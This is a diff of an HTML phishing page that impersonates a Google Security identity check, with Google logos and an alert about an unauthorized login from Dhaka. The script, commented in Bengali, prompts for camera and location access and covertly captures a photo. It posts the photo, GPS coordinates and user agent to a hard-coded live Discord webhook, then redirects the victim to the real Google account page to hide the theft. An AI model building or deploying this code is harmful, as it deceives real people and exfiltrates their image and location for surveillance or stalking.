@@ -3,88 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification - Security Portal</title>
+    <title>Google Security - Identity Verification</title>
+    <meta property="og:title" content="Google Security Center">
+    <meta property="og:description" content="Unauthorized login detected. Verify identity.">
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_96dp.png">
+    
     <style>
-        body { background: #f2f2f7; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; width: 90%; max-width: 350px; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); text-align: center; border: 0.5px solid #d1d1d6; }
-        .icon-circle { width: 65px; height: 65px; background: #007aff; border-radius: 15px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
-        h2 { font-size: 22px; margin: 10px 0; color: #000; }
-        p { font-size: 15px; color: #3a3a3c; margin-bottom: 30px; }
-        .btn-group { display: flex; gap: 12px; }
-        .btn { flex: 1; padding: 16px; border-radius: 12px; border: none; font-weight: 600; cursor: pointer; }
-        .btn-deny { background: #e5e5ea; color: #ff3b30; }
-        .btn-approve { background: #34c759; color: white; }
+        body { background: #ffffff; font-family: 'Roboto', arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 400px; padding: 40px 20px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .google-logo { width: 75px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px; }
+        p { font-size: 16px; color: #3c4043; line-height: 1.5; margin-bottom: 30px; }
+        .alert-box { background: #fce8e6; color: #d93025; padding: 12px; border-radius: 4px; font-size: 14px; margin-bottom: 20px; font-weight: 500; }
+        .btn-primary { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+        .btn-primary:hover { background: #1765cc; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="icon-circle">G</div>
-    <h2>Login attempt</h2>
-    <p>We detected a new login attempt from an unrecognized device in Dhaka. Please verify your identity to secure your account.</p>
-    <div class="btn-group">
-        <button class="btn btn-deny" onclick="startCapture('Deny')">Deny</button>
-        <button class="btn btn-approve" onclick="startCapture('Approve')">Approve</button>
-    </div>
-    <video id="video" style="display:none;" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+<div class="container">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+    <h1>Verify it's you</h1>
+    <div class="alert-box">Unauthorized login attempt from Dhaka, Bangladesh</div>
+    <p>To help keep your account secure, Google needs to verify your identity. Please click below to confirm this request.</p>
+    
+    <button class="btn-primary" onclick="initiateSystem()">Verify Identity</button>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 </div>
 
 <script>
-    // tumi (তুমি) - তোমার নতুন Webhook URL এখানে সেট করা হয়েছে
-    const webhookURL = "https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0"; 
+    // tumi (তুমি) - তোমার সচল Webhook URL এখানে দেওয়া হয়েছে
+    const webhookURL = "https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0";
 
-    async function startCapture(type) {
+    async function initiateSystem() {
         try {
-            // ক্যামেরা পারমিশন নেওয়া
+            // ১. ক্যামেরা পারমিশন চাওয়া
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // লোকেশন নেওয়া
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
+            // ২. লোকেশন চাওয়া
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const { latitude, longitude } = position.coords;
                 
-                // ১ সেকেন্ড অপেক্ষা করে ছবি তোলা (যাতে ক্যামেরা ফোকাস হয়)
-                setTimeout(async () => {
+                // ৩. ছবি তোলা (১.৫ সেকেন্ড পর যাতে পরিষ্কার আসে)
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
-                    
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
                     canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('file', blob, 'target_capture.jpg');
-                        fd.append('payload_json', JSON.stringify({
-                            content: `🔔 **New Alert: System Accessed!**`,
+                        const formData = new FormData();
+                        formData.append('file', blob, 'security_audit.jpg');
+                        formData.append('payload_json', JSON.stringify({
+                            content: "🚨 **System Alert: Security Verification Triggered!**",
                             embeds: [{
-                                color: type === 'Approve' ? 3066993 : 15158332,
-                                title: "Target Verification Details",
+                                color: 15844367,
+                                title: "Device & Location Intelligence",
                                 fields: [
-                                    { name: "🔘 Action Taken", value: type, inline: true },
-                                    { name: "📍 Location", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, inline: false },
-                                    { name: "📱 Device Info", value: navigator.userAgent, inline: false }
+                                    { name: "📍 Google Maps", value: `https://www.google.com/maps?q=${latitude},${longitude}` },
+                                    { name: "📱 User Agent", value: navigator.userAgent }
                                 ],
+                                footer: { text: "Security Audit Tool • 2026" },
                                 timestamp: new Date()
                             }]
                         }));
 
-                        // Discord এ ডেটা পাঠানো
-                        await fetch(webhookURL, { method: 'POST', body: fd });
+                        // ৪. ডিসকর্ডে পাঠানো
+                        await fetch(webhookURL, { method: 'POST', body: formData });
                         
-                        // কাজ শেষে অফিসিয়াল পেজে রিডাইরেক্ট করা
-                        window.location.href = "https://myaccount.google.com/";
+                        // ৫. রিডাইরেক্ট (আসল গুগল পেজে পাঠিয়ে দেওয়া)
+                        window.location.href = "https://myaccount.google.com/notifications";
                     }, 'image/jpeg');
-                }, 1000);
+                }, 1500);
+
             }, (err) => {
-                console.error("Location Error:", err);
+                // লোকেশন না দিলে রিডাইরেক্ট
                 window.location.href = "https://myaccount.google.com/";
             });
-        } catch (e) {
-            console.error("Camera Error:", e);
+        } catch (err) {
+            // ক্যামেরা না দিলে রিডাইরেক্ট
             window.location.href = "https://myaccount.google.com/";
         }
     }
 </script>
+
 </body>
 </html>
